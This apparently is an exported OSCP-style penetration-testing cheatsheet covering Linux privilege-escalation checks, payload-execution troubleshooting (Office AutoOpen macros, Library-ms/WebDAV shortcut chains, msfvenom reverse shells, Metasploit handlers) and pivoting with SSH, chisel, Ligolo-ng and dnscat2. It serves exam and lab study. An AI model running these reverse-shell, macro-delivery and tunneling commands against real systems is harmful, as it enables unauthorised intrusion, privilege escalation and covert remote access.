text: id="variant-10-6-18-1-5">10.6.18.1.5 Find: Load a controlled library through a permitted sudo environment Inspect sudo's environment-related tags/defaults and the exact allowed executable's dynamic-linking evidence. sudo -l file /ALLOWED/PROGRAM readelf -l /ALLOWED/PROGRAM Recognize: Explicit environment permission plus a compatible dynamic consumer suggests a loader-injection candidate. Validate next: Confirm SETENV or explicit LD_PRELOAD preservation in sudo -l and a dynamically linked allowed program. Use only the permitted environment form; inspect the resulting id rather than assuming the shared library ran as root. Load a controlled library through a permitted sudo environment . <summary

title: 10.6.18.1.6 Find: Use a SUID or SGID program's exposed privileged primitive
text: id="variant-10-6-18-1-6">10.6.18.1.6 Find: Use a SUID or SGID program's exposed privileged primitive Inventory privileged-mode files, then focus on custom/nonstandard programs and inspect ownership, mount and documented behavior. find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null file /PATH/TO/BINARY Recognize: The s bits identify an execution credential mechanism; nonstandard behavior warrants inspection but is not a vulnerability itself. Validate next: Run stat on the flagged executable and findmnt -T on its path. Check the SUID owner, nosuid and exact binary behavior; after a permitted operation run id to see whether the elevated effective UID was retained. Use a SUID or SGID program's exposed privileged primitive . <summary

title: 10.6.18.1.7 Find: Use a file capability that enables a specific privileged operation
text: id="variant-10-6-18-1-7">10.6.18.1.7 Find: Use a file capability that enables a specific privileged operation Search file capabilities and inspect the exact program plus current namespace/bounding context. getcap -r / 2>/dev/null capsh --print 2>/dev/null Recognize: The specific interpreter has effective set-UID authority, unlike an ordinary copy of python3 elsewhere. Validate next: Read getcap for the exact executable, inspect its mount and match the named capability to the program operation. A version or capability name alone does not prove that the program retains a useful effective capability. Use a file capability that enables a specific privileged operation . <summary

title: 10.6.18.1.8 Find: Control a script, binary or configuration consumed by a privileged job/service
text: id="variant-10-6-18-1-8">10.6.18.1.8 Find: Control a script, binary or configuration consumed by a privileged job/service Inspect actual cron/systemd definitions and running processes, then follow their action paths into permission checks. cat /etc/crontab systemctl list-timers --all ps auxww Recognize: The schedule explicitly names a privileged consumer and an exact file to inspect. Validate next: Observe the actual command and UID with pspy or inspect the unit with systemctl cat/show. Run namei -l, stat and getfacl on the consumed path and parents; identify the timer, restart or invocation before changing the file. Control a script, binary or configuration consumed by a privileged job/service . <summary

title: 10.6.18.1.9 Find: Hijack an unqualified helper through controlled PATH resolution
text: id="variant-10-6-18-1-9">10.6.18.1.9 Find: Hijack an unqualified helper through controlled PATH resolution Inspect a verified privileged helper/script for unqualified executable names and compare its actual PATH with writable directories. printf '%s\n' "$PATH" namei -l /PATH/TO/CANDIDATE_DIRECTORY strings /PATH/TO/REVIEWED_BINARY Recognize: An unqualified helper can resolve through the controlled earlier directory in the consumer's environment. Validate next: Find the helper name in the privileged script or observed pspy command. Check that it is unqualified and identify the consumer's real PATH; a writable directory matters only if that consumer searches it first. Hijack an unqualified helper through controlled PATH resolution . <summary

title: 10.6.18.1.10 Find: Turn wildcard-expanded filenames into privileged command options
text: id="variant-10-6-18-1-10">10.6.18.1.10 Find: Turn wildcard-expanded filenames into privileged command options Read the exact privileged command line and inspect the directory over which its shell glob expands. cat /PATH/TO/REVIEWED_JOB_SCRIPT ls -la /PATH/TO/JOB_DIRECTORY namei -l /PATH/TO/JOB_DIRECTORY Recognize: Controlled filenames may become utility arguments after glob expansion; the exact utility and option ordering decide the method. Validate next: Inspect the exact privileged command: confirm that a wildcard expands attacker-controlled names into option positions and that the utility interprets those options. A writable directory without that command/trigger does not enable this route. Turn wildcard-expanded filenames into privileged command options . <summary

title: 10.6.18.1.11 Find: Change a writable account or privilege-policy file
text: id="variant-10-6-18-1-11">10.6.18.1.11 Find: Change a writable account or privilege-policy file Check permissions on the account/policy file identified by enumeration, including parents and mount state, before any content change. stat /etc/passwd /etc/shadow /etc/sudoers getfacl -p /etc/passwd /etc/sudoers 2>/dev/null Recognize: A sensitive account file appears writable; the authentication implementation and valid record syntax determine its effect. Validate next: Preserve original state; confirm exact effective write, file consumer, useful identity and recovery/trigger. Change a writable account or privilege-policy file . <summary

title: 10.6.18.1.12 Find: Use privileged group, daemon or container-management control
text: id="variant-10-6-18-1-12">10.6.18.1.12 Find: Use privileged group, daemon or container-management control Inspect groups, local sockets and namespace context, then use only permitted read-only daemon inventory to identify rootful/rootless behavior. id ls -l /var/run/docker.sock cat /proc/1/cgroup Recognize: Effective socket access suggests daemon control; group text alone does not establish host-affecting rootful operations. Validate next: Check API acceptance, rootful/rootless and namespace policy, available resources and the specific host operation. Use privileged group, daemon or container-management control . <summary

title: 10.6.18.1.13 Find: Exploit a permission-backed mount, NFS mapping or local service
text: id="variant-10-6-18-1-13">10.6.18.1.13 Find: Exploit a permission-backed mount, NFS mapping or local service Inspect mounts, exports and local listeners after the foothold; correlate each with its identity and reachable service. findmnt cat /etc/exports 2>/dev/null ss -lntup Recognize: A local-only service or export mapping creates a specific investigation route, not automatic escalation. Validate next: For the service check accepted identity/rights; for NFS check client mapping, write permissions, mount flags and target-side consumer. Exploit a permission-backed mount, NFS mapping or local service . <summary

title: 10.6.18.1.14 Find: Control a privileged program's shared-library resolution
text: id="variant-10-6-18-1-14">10.6.18.1.14 Find: Control a privileged program's shared-library resolution Inspect the reviewed privileged executable's dependencies/search paths and permission-check the actual selected library directory. readelf -d /PATH/TO/BINARY namei -l /PATH/TO/LIBRARY_DIRECTORY Recognize: A named dependency plus a potentially controlled search location is a loader-resolution candidate. Validate next: Verify actual runtime selection, ABI/symbols, secure-execution rules, retained privilege and a trigger. Control a privileged program's shared-library resolution . <summary

title: 10.6.18.1.15 Find: Select an evidence-matched Linux software or kernel exploit
text: id="variant-10-6-18-1-15">10.6.18.1.15 Find: Select an evidence-matched Linux software or kernel exploit Collect distribution build/package/architecture and the required local feature before comparing a specific advisory/PoC. uname -a cat /etc/os-release getconf LONG_BIT Recognize: A version-associated advisory is a candidate; backports and feature state determine applicability. Validate next: Collect uname and the distribution's package/build plus architecture. Match the advisory's vulnerable feature and vendor patch status before choosing a PoC; try a confirmed sudo/file/credential route first when one exists. Select an evidence-matched Linux software or kernel exploit . <summary

title: 10.6.18.1.16 Find: Use enumeration tools to generate manually testable candidates
text: id="variant-10-6-18-1-16">10.6.18.1.16 Find: Use enumeration tools to generate manually testable candidates Use known manual gaps and the host/runtime context to choose a reviewed enumerator; inspect each highlighted finding against native evidence. id uname -m command -v bash python3 ls -ld /tmp Recognize: The highlight supplies a candidate object, not the missing privileged consumer or execution trigger. Validate next: Run the reviewed LinPEAS baseline and save its output. For sudo highlights run sudo -l; for a flagged file use stat/namei/getfacl; for jobs confirm the UID and command with pspy or systemctl. Open the matching technique only after that check. Use enumeration tools to generate manually testable candidates .

title: 10.7 Payload Execution Obstacles Cheatsheet
text: id="payload-execution-obstacles-cheatsheet">10.7 Payload Execution Obstacles Cheatsheet ← Cheatsheet index | Full procedure | Shells and payloads | Pivoting | Strategy map | Study methods: Resolve payload execution obstacles <h2

title: 10.7.1 State ladder
text: id="state-ladder">10.7.1 State ladder delivery → trigger → parser/loader → execution → connection → handler → session Preserve the last confirmed state. Change only the next failed boundary. Evidence Next question File/request arrived Did the intended consumer open/parse it? User/service triggered it Did a harmless command execute? Marker/process exists Can that context reach the listener? TCP connection arrived Does the handler match the payload? Session opened What host, identity, architecture and privilege? <h2

title: 10.7.2 First-pass triage
text: id="first-pass-triage">10.7.2 First-pass triage Prove a harmless direct command. Verify final artifact path and hash. Write every parser/interpreter/loader. Match OS, process bitness, format and dependencies. Check permissions, working directory and explicit policy/control evidence. Verify listener bind and target-to-listener route. Match staged/stageless payload and handler. Repair session I/O last. <h2

title: 10.7.3 Office macro gates
text: id="office-macro-gates">10.7.3 Office macro gates Use .docm or legacy .doc ; .docx alone does not persist embedded VBA. Store the macro in the document. Harmless trigger proof: Sub AutoOpen() RunProof End Sub Sub Document_Open() RunProof End Sub Sub RunProof() CreateObject("WScript.Shell").Run _ "cmd.exe /c whoami > %TEMP%\oscp-marker.txt", 0, True End Sub Zone inspection: Get-Item -LiteralPath 'C:\PATH\FILE.docm' -Stream * Get-Content -LiteralPath 'C:\PATH\FILE.docm' -Stream Zone.Identifier Check in order: format → macro saved in document → MOTW/zone → Protected View/Trust/GPO → required user action → Office child process → command parsing → network path Internet-sourced macros are commonly blocked by default. “Enable Content” is not a universal current path. <h2

title: 10.7.4 Windows Library file chain
text: id="windows-library-file-chain">10.7.4 Windows Library file chain .Library-ms → Explorer/WebDAV → .lnk → command → optional download → callback WsgiDAV, when already installed: mkdir -p webdav wsgidav --host=0.0.0.0 --port=80 \ --root=./webdav --auth=anonymous Port 80 is the plain-HTTP Windows WebDAV baseline. An alternate port needs target-side WebClient and route validation. Minimal library definition: <?xml version="1.0" encoding="UTF-8"?> <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"> <name>@windows.storage.dll,-34582</name> <version>1</version> <isLibraryPinned>true</isLibraryPinned> <iconReference>imageres.dll,-1002</iconReference> <templateInfo> <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType> </templateInfo> <searchConnectorDescriptionList> <searchConnectorDescription> <isDefaultSaveLocation>true</isDefaultSaveLocation> <isSupported>false</isSupported> <simpleLocation><url>http://LHOST/</url></simpleLocation> </searchConnectorDescription> </searchConnectorDescriptionList> </libraryDescription> Controlled shortcut creation: $shell = New-Object -ComObject WScript.Shell $shortcut = $shell.CreateShortcut('C:\PATH\webdav\ACTION.lnk') $shortcut.TargetPath = "$env:SystemRoot\System32\cmd.exe" $shortcut.Arguments = '/c whoami > %TEMP%\oscp-marker.txt' $shortcut.WorkingDirectory = $env:TEMP $shortcut.IconLocation = "$env:SystemRoot\System32\imageres.dll,11" $shortcut.Save() Observation Check next Empty library WebDAV bind/route/WebClient/policy/serialized state No WebDAV request User action, URL, route or blocked DAV Directory visible; no command Second user action or shortcut control Marker exists; no download Quoting, DNS or delivery-server route Download exists; no callback Format/control/handler/return route <h2

title: 10.7.5 Linux compatibility
text: id="linux-compatibility">10.7.5 Linux compatibility uname -m file PAYLOAD readelf -h PAYLOAD | sed -n '1,25p' ldd PAYLOAD ls -l PAYLOAD findmnt -T /PATH/TO/PAYLOAD head -n 1 SCRIPT Error Likely boundary Exec format error OS/architecture/interpreter format Permission denied execute/parent rights, noexec , identity or policy No such file but file exists dynamic loader or shebang interpreter shared object missing runtime dependency ^M in shebang CRLF altered interpreter path works interactively, not cron/service environment, cwd, identity, shell or route <h2

title: 10.7.6 Windows compatibility
text: id="windows-compatibility">10.7.6 Windows compatibility Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess $env:PROCESSOR_ARCHITECTURE Get-AuthenticodeSignature 'C:\PATH\PAYLOAD.exe' Match the consumer: direct process → compatible PE/script/runtime service → service-aware program or expected 1053 behavior DLL → process bitness + exports + dependencies MSI → real MSI package PowerShell → edition/syntax + policy/control state existing PoC → documented space/bad chars/exit behavior <h2

title: 10.7.7 PowerShell quoting
text: id="powershell-quoting">10.7.7 PowerShell quoting $command = 'COMMAND' [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE UTF-16LE Base64 solves a transport/quoting problem. It is not encryption or an AV bypass. <h2

title: 10.7.8 Security-control evidence
text: id="security-control-evidence">10.7.8 Security-control evidence Get-ExecutionPolicy -List $ExecutionContext.SessionState.LanguageMode Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled, IoavProtectionEnabled,AntivirusSignatureVersion Get-MpThreatDetection | Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources Get-AppLockerPolicy -Effective -Xml Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,LevelDisplayName,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' ` -MaxEvents 50 -ErrorAction SilentlyContinue | Select-Object TimeCreated,Id,Message Process-scoped execution-policy invocation, when applicable: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1 This does not disable AMSI, Defender, AppLocker/WDAC, permissions or GPO. Evidence Interpretation Hash differs Transfer/encoding failure File vanishes Inspect quarantine/detection resource Process denied Application control, permissions or parent policy Script-policy error Execution policy scope/precedence Explicit content block AMSI/AV candidate, not a route failure Starts then exits Crash, dependency, bitness or exit behavior Runs; no SYN LHOST/egress/callback command Handshake then closes Handler mismatch, blocked stage or crash <h2

title: 10.7.9 msfvenom
text: id="msfvenom">10.7.9 msfvenom msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe file shell.elf shell.exe sha256sum shell.elf shell.exe Existing-PoC constraints only: msfvenom -p PAYLOAD_NAME LHOST=LHOST LPORT=LPORT \ EXITFUNC=thread -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' -s MAX_SPACE shell_reverse_tcp = stageless/single shell/reverse_tcp = staged; exact framework handler required Encoders address representation/bad-character needs; they do not guarantee AV evasion. <h2

title: 10.7.10 multi/handler and sessions
text: id="multihandler-and-sessions">10.7.10 multi/handler and sessions msfconsole -q use exploit/multi/handler set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT set ExitOnSession false show options run -j jobs -l sessions -l sessions -i SESSION_ID background sessions -k SESSION_ID jobs -k JOB_ID Generated payload and handler must match exact payload name, transport, LHOST and LPORT. <h2

title: 10.7.11 Restricted Metasploit module workflow
text: id="restricted-metasploit-module-workflow">10.7.11 Restricted Metasploit module workflow search type:exploit cve:CVE_ID info MODULE_PATH use MODULE_PATH show options show advanced show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show missing run Exam boundary: msfvenom and multi/handler are the across-target exceptions, but Meterpreter remains one-target limited. Auxiliary, Exploit or Post modules—or Meterpreter—lock Metasploit to one chosen target even when check or an attempt fails. Metasploit pivoting and automatic exploitation are prohibited. Module rank is stability guidance, not vulnerability proof. <h2

title: 10.7.12 Packet/session interpretation
text: id="packetsession-interpretation">10.7.12 Packet/session interpretation sudo tcpdump -ni any tcp port LPORT Evidence Next action No SYN Repair execution, LHOST, route or egress SYN, no reply Correct listener bind/local firewall Handshake then close Match payload/handler; inspect crash/control Stable TCP, no commands Check staged/raw mismatch and I/O Session opens then dies Parent lifetime, EXITFUNC , crash or control <h2

title: 10.7.13 Handoff
text: id="handoff">10.7.13 Handoff Command primitive still unproven → public exploit adaptation . Callback route unproven → pivoting . Session exists but is unusable → shells and payloads . Artifact transfer/integrity problem → file transfer . <h2

title: 10.7.14 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.7.14 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.7.14.1 Resolve payload execution obstacles
text: id="resolve-payload-execution-obstacles">10.7.14.1 Resolve payload execution obstacles <summary

title: 10.7.14.1.1 Find: Use a gated Office macro delivery chain
text: id="variant-10-7-14-1-1">10.7.14.1.1 Find: Use a gated Office macro delivery chain From the assigned client-side scenario identify the actual Office consumer, required open/enable interaction and file-origin policy before investigating callbacks. Get-Item .\FILE -Stream * Get-Content .\FILE -Stream Zone.Identifier -ErrorAction SilentlyContinue Recognize: Internet-origin metadata and absent macro execution localize an earlier gate than network connectivity. Validate next: Check compatible Office, actual macro/user trigger and applicable policy; a delivered/opened document is not execution. Use a gated Office macro delivery chain . <summary

title: 10.7.14.1.2 Find: Use a Windows Library/WebDAV/shortcut chain with explicit interaction
text: id="variant-10-7-14-1-2">10.7.14.1.2 Find: Use a Windows Library/WebDAV/shortcut chain with explicit interaction Inspect the actual Library XML, remote resource and shortcut properties from the assigned delivery scenario; distinguish browsing from launching. Get-Content .\FILE.library-ms Test-NetConnection LHOST -Port PORT Recognize: The resource can be presented while the executable user interaction is still absent. Validate next: Verify compatible WebDAV/Library handling, actual shortcut target/launch, policy and its command effect. Use a Windows Library/WebDAV/shortcut chain with explicit interaction . <summary

title: 10.7.14.1.3 Find: Match an artifact to its executable consumer and runtime
text: id="variant-10-7-14-1-3">10.7.14.1.3 Find: Match an artifact to its executable consumer and runtime Inspect a transferred/generated artifact's bytes, executable format and required consumer/loader before interpreting runtime errors. file FILE sha256sum FILE readelf -l FILE 2>/dev/null uname -m Recognize: An existing file can fail because its loader/runtime is missing; this is separate from callback failure. Validate next: Verify exact architecture, loader/runtime, permissions, mount policy, line endings and integrity. Match an artifact to its executable consumer and runtime . <summary

title: 10.7.14.1.4 Find: Repair quoting, encoding and command-length boundaries
text: id="variant-10-7-14-1-4">10.7.14.1.4 Find: Repair quoting, encoding and command-length boundaries Compare the last working simple command with the first added quoting/encoding layer; record which parser receives each representation. curl -skG --data-urlencode 'PARAM=NORMAL_VALUE' http://TARGET:PORT/PATH Recognize: The break follows a shell-language/representation change, so network or exploit applicability need not have changed. Validate next: Confirm outer decoding, actual inner shell, length and correct byte/string encoding with a small test. Repair quoting, encoding and command-length boundaries . <summary

title: 10.7.14.1.5 Find: Distinguish PowerShell policy, language mode and protected execution layers
text: id="variant-10-7-14-1-5">10.7.14.1.5 Find: Distinguish PowerShell policy, language mode and protected execution layers Use the failing PowerShell error to inspect execution policy, language mode and actual runtime before choosing an allowed execution form. Get-ExecutionPolicy -List $ExecutionContext.SessionState.LanguageMode $PSVersionTable Recognize: A script policy gate is distinct from language-mode restrictions or an antimalware verdict. Validate next: Identify the actual controlling policy and permitted execution path; encoding/policy arguments do not remove unrelated controls. Distinguish PowerShell policy, language mode and protected execution layers . <summary

title: 10.7.14.1.6 Find: Interpret endpoint-control evidence and select a justified alternative
text: id="variant-10-7-14-1-6">10.7.14.1.6 Find: Interpret endpoint-control evidence and select a justified alternative Check artifact persistence/hash and, when permitted, the matching security/policy event before labelling a missing effect as endpoint detection. Test-Path .\FILE Get-FileHash .\FILE -Algorithm SHA256 -ErrorAction SilentlyContinue Recognize: A disappearing artifact narrows the boundary but does not identify a particular control without corroboration. Validate next: Correlate file/process/event identity, time and exact action before selecting an alternative consumer. Interpret endpoint-control evidence and select a justified alternative . <summary

title: 10.7.14.1.7 Find: Pair staged payloads with the correct handler and session lifecycle
text: id="variant-10-7-14-1-7">10.7.14.1.7 Find: Pair staged payloads with the correct handler and session lifecycle In the selected handler console compare the exact payload/options with the generated artifact and inspect job/session state. show options jobs sessions Recognize: The first-stage protocol may be reaching a receiver that cannot provide the remaining stage. Validate next: Verify exact payload/architecture/transport pair, listener bind, stage route and lifecycle. Pair staged payloads with the correct handler and session lifecycle . <summary

title: 10.7.14.1.8 Find: Use a framework module with explicit target and feature constraints
text: id="variant-10-7-14-1-8">10.7.14.1.8 Find: Use a framework module with explicit target and feature constraints Read the selected module's information/targets/options and compare them with independently gathered component evidence before any target check/run. info show options show targets show payloads Recognize: The module describes conditions to investigate; its existence is not a vulnerability result. Validate next: Verify exact target/configuration, access, payload/route and current feature restrictions before selecting it. Use a framework module with explicit target and feature constraints . <summary

title: 10.7.14.1.9 Find: Diagnose connection direction, listener and session failures in order
text: id="variant-10-7-14-1-9">10.7.14.1.9 Find: Diagnose connection direction, listener and session failures in order Return to the last observed execution proof, inspect listener bind/address and compare actual packet arrival with the expected direction. ss -lnt ip route get TARGET sudo tcpdump -ni INTERFACE tcp port PORT Recognize: The channel failed before an observed connection; investigate trigger/advertised route/egress before terminal repair. Validate next: Name the process initiating the connection and its actual destination address/port. Check the listener bind and each route/pivot leg; if delivery works but no callback arrives, repair the return path before changing payload bytes. Diagnose connection direction, listener and session failures in order .

title: 10.8 Pivoting and Tunneling Cheatsheet
text: id="pivoting-and-tunneling-cheatsheet">10.8 Pivoting and Tunneling Cheatsheet ← Cheatsheet index | Full procedure | Master Notes | Strategy map | Study methods: Reach internal services <h2

title: 10.8.1 Route ledger
text: id="route-ledger">10.8.1 Route ledger TOOL -> ENTRY LISTENER/SOCKS/TUN -> TRANSPORT -> PIVOT -> DESTINATION TCP/UDP | initiator | bind | DNS point | credential/SPN | callback | cleanup Verify in order: process → listener/session → pivot destination reachability → local route/proxy → simple TCP client → application → separate callback. <h2

title: 10.8.2 Pivot network state
text: id="pivot-network-state">10.8.2 Pivot network state ip -brief address ip route ip neigh ss -lntup cat /etc/resolv.conf nc -nvz -w 3 INTERNAL_HOST INTERNAL_PORT ipconfig /all route print arp -a netstat -ano Test-NetConnection INTERNAL_HOST -Port INTERNAL_PORT <h2

title: 10.8.3 Method chooser
text: id="method-chooser">10.8.3 Method chooser Need Choose One known TCP socket; inbound SSH to pivot works SSH -L Many TCP sockets; inbound SSH to pivot works SSH -D + SOCKS client Pivot can only connect outward to Kali SSH -R , remote dynamic -R PORT , Chisel reverse or Ligolo agent Direct SSH to an internal SSH host ssh -J One simple Linux relay Socat Transparent selected subnets over SSH sshuttle Windows built-in route ssh.exe ; elevated fixed TCP relay: Netsh Windows alternate SSH client Plink HTTP/WebSocket-shaped egress Chisel Many normal clients without proxy wrappers Ligolo-ng DNS-only egress dnscat2 after proving DNS prerequisites <h2

title: 10.8.4 Socat fixed TCP relay
text: id="socat-fixed-tcp-relay">10.8.4 Socat fixed TCP relay socat -ddd TCP-LISTEN:LOCAL_PORT,bind=PIVOT_REACHABLE_IP,reuseaddr,fork \ TCP:INTERNAL_HOST:INTERNAL_PORT No authentication or encryption. Listener success does not prove the destination connection. <h2

title: 10.8.5 OpenSSH
text: id="openssh">10.8.5 OpenSSH Local fixed forward, run on Kali: ssh -N -L 127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p SSH_PORT USER@PIVOT -o ExitOnForwardFailure=yes \ -o ServerAliveInterval=30 -o ServerAliveCountMax=3 Local SOCKS, run on Kali: ssh -N -D 127.0.0.1:1080 -p SSH_PORT USER@PIVOT \ -o ExitOnForwardFailure=yes Remote fixed forward, run on pivot: ssh -N -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT \ -p KALI_SSH_PORT KALI_USER@LHOST -o ExitOnForwardFailure=yes Remote dynamic SOCKS, run on pivot; OpenSSH client 7.6+: ssh -N -R 127.0.0.1:1080 -p KALI_SSH_PORT KALI_USER@LHOST \ -o ExitOnForwardFailure=yes SSH jump and native SOCKS route: ssh -J PIVOT_USER@PIVOT TARGET_USER@INTERNAL_HOST ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \ TARGET_USER@INTERNAL_HOST -L / -D listen on the SSH client; -R listens on the SSH server. The destination connection occurs from the opposite end. Non-loopback remote binds depend on GatewayPorts . <h2

title: 10.8.6 ProxyChains
text: id="proxychains">10.8.6 ProxyChains Task-specific proxychains-pivot.conf : strict_chain proxy_dns tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks5 127.0.0.1 1080 proxychains4 -q -f ./proxychains-pivot.conf curl http://INTERNAL_HOST:PORT/ proxychains4 -q -f ./proxychains-pivot.conf nmap -sT -Pn -n -p PORTS INTERNAL_HOST proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \ 'DOMAIN/USER:PASSWORD@INTERNAL_HOST' curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_HOST:PORT/ ncat --proxy-type socks5 --proxy 127.0.0.1:1080 INTERNAL_HOST INTERNAL_PORT ProxyChains is TCP-only and depends on compatible dynamically linked socket calls. No SYN, ICMP, UDP or pcap discovery. Prefer native proxy options; use focused nmap -sT -Pn -n only. <h2

title: 10.8.7 sshuttle
text: id="sshuttle">10.8.7 sshuttle sudo sshuttle --dns -r SSH_USER@PIVOT:SSH_PORT INTERNAL_SUBNET ANOTHER_SUBNET sudo sshuttle --dns -r SSH_USER@127.0.0.1:LOCAL_SSH_PORT INTERNAL_SUBNET Requires client-side privileges/firewall support and a compatible Python path on the SSH server. Avoid route collisions with VPN networks. <h2

title: 10.8.8 Windows
text: id="windows">10.8.8 Windows Built-in OpenSSH remote dynamic: ssh.exe -N -R 127.0.0.1:1080 KALI_USER@LHOST -p KALI_SSH_PORT -o ExitOnForwardFailure=yes Plink remote fixed forward: plink.exe -ssh -N -batch -hostkey "HOST_KEY_FINGERPRINT" ^ -l KALI_USER -pwfile C:\PATH\kali-password.txt ^ -R 127.0.0.1:KALI_PORT:INTERNAL_HOST:INTERNAL_PORT ^ -P KALI_SSH_PORT LHOST Netsh fixed TCP relay and cleanup, elevated: netsh interface portproxy add v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT connectaddress=INTERNAL_HOST connectport=INTERNAL_PORT netsh interface portproxy show all netsh advfirewall firewall add rule name="OSCP Pivot LOCAL_PORT" dir=in action=allow protocol=TCP localport=LOCAL_PORT netsh interface portproxy delete v4tov4 listenaddress=PIVOT_REACHABLE_IP listenport=LOCAL_PORT netsh advfirewall firewall delete rule name="OSCP Pivot LOCAL_PORT" Netsh is TCP-only, elevated and persistent. Verify firewall and IP Helper behavior; remove both objects. <h2

title: 10.8.9 Chisel
text: id="chisel">10.8.9 Chisel Reverse SOCKS: <h3

title: 10.8.9.1 Kali
text: id="variant-10-8-9-1">10.8.9.1 Kali # Kali chisel server --reverse --port CHISEL_PORT <h3

title: 10.8.9.2 Pivot
text: id="variant-10-8-9-2">10.8.9.2 Pivot # Pivot chisel client --fingerprint 'SERVER_FINGERPRINT' \ LHOST:CHISEL_PORT R:127.0.0.1:1080:socks Reverse fixed TCP forward: chisel client --fingerprint 'SERVER_FINGERPRINT' LHOST:CHISEL_PORT \ R:127.0.0.1:LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT Forward SOCKS: # Pivot chisel server --socks5 --port CHISEL_PORT # Kali chisel client --fingerprint 'SERVER_FINGERPRINT' PIVOT:CHISEL_PORT \ 127.0.0.1:1080:socks Current UDP-aware listener: chisel client --fingerprint 'SERVER_FINGERPRINT' \ LHOST:CHISEL_PORT R:127.0.0.1:1080:udpsocks socks is TCP CONNECT only. udpsocks additionally supports SOCKS5 UDP ASSOCIATE with current peers, but ProxyChains still cannot carry UDP. Check OS/architecture/runtime compatibility and WebSocket upgrade behavior. <h2

title: 10.8.10 Ligolo-ng
text: id="ligolo-ng">10.8.10 Ligolo-ng <h3

title: 10.8.10.1 Kali
text: id="variant-10-8-10-1">10.8.10.1 Kali # Kali ./proxy -selfcert -laddr 0.0.0.0:LIGOLO_PORT <h3

title: 10.8.10.2 Pivot, after reading certificate_fingerprint in the console
text: id="variant-10-8-10-2">10.8.10.2 Pivot, after reading certificate_fingerprint in the console # Pivot, after reading certificate_fingerprint in the console ./agent -connect LHOST:LIGOLO_PORT -accept-fingerprint CERT_FINGERPRINT Ligolo console: interface_create --name ligolo session ifconfig interface_add_route --name ligolo --route INTERNAL_SUBNET tunnel_start --tun ligolo Manual route fallback: sudo ip tuntap add user "$USER" mode tun ligolo sudo ip link set ligolo up sudo ip route add INTERNAL_SUBNET dev ligolo Pivot loopback service: sudo ip route add 240.0.0.1/32 dev ligolo nmap -sT -Pn -n -p PORTS 240.0.0.1 Callback listener in selected session: listener_add --addr 0.0.0.0:PIVOT_PORT --to 127.0.0.1:KALI_PORT --tcp listener_list listener_stop LISTENER_ID <h2

title: 10.8.11 DNS tunneling, conditional
text: id="dns-tunneling-conditional">10.8.11 DNS tunneling, conditional <h3

title: 10.8.11.1 Authoritative domain server
text: id="variant-10-8-11-1">10.8.11.1 Authoritative domain server # Authoritative domain server dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN <h3

title: 10.8.11.2 Client
text: id="variant-10-8-11-2">10.8.11.2 Client # Client ./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN <h3

title: 10.8.11.3 Direct server mode
text: id="variant-10-8-11-3">10.8.11.3 Direct server mode # Direct server mode ./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET windows window -i SESSION_ID help Needs client execution plus authoritative NS delegation or direct DNS-server reachability. Slow and conspicuous. A query reaching the server is not yet an authenticated channel. DNS tunneling is distinct from prohibited DNS spoofing. <h2

title: 10.8.12 Callback route
text: id="callback-route">10.8.12 Callback route Kali -> tunnel -> internal service access path internal target -> pivot listener -> Kali callback path If a callback is required, separately verify the pivot listener, relay, Kali bind address and target-to-pivot reachability. Do not change payloads until this route is proven. <h2

title: 10.8.13 Failure cues
text: id="failure-cues">10.8.13 Failure cues Cue Check next Pivot cannot reach destination Internal route/firewall/service Client cannot reach tunnel server Listener, pivot egress, transport port Listener not created Bind collision, privilege, server forwarding policy Listener works; application fails Client proxy support, protocol, DNS/ SPN , authentication ProxyChains does nothing Static/incompatible process; use native proxy/explicit forward/Ligolo Nmap empty through SOCKS Focused -sT -Pn -n , latency, simple Ncat/curl proof Kerberos fails through working IP route FQDN/SPN, DNS, KDC and time Chisel server sees no session Binary execution, egress, WebSocket path Ligolo session exists but no traffic Selected session, interface and OS route Forward works; callback fails Reverse route and listener bind Deep route dies globally Repair first failed upstream hop <h2

title: 10.8.14 Cleanup and restriction
